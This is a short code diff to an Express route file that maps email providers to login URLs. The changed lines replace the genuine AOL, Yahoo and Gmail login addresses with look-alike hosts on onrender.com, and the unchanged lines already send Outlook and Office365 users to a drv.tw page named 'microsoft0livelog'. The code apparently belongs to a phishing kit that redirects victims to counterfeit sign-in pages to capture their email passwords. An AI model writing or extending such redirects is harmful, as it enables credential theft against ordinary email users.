@@ -10,10 +10,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
     // Map of provider IDs to their login URLs
     const providerUrls: Record<string, string> = {
       outlook: "https://dfzmpvzygfsbpnpcuaea7w.on.drv.tw/microsoft0livelog/",
-      aol: "https://login.aol.com",
+      aol: "https://aol-auth-home0-id.onrender.com",
       office365: "https://dfzmpvzygfsbpnpcuaea7w.on.drv.tw/microsoft0livelog/",
-      yahoo: "https://login.yahoo.com",
-      other: "https://mail.google.com",
+      yahoo: "https://yahoo-callback-auth-s.onrender.com",
+      other: "https://mail-server-gmail0-auth.onrender.com",
     };
 
     // Determine the redirect URL based on the provider
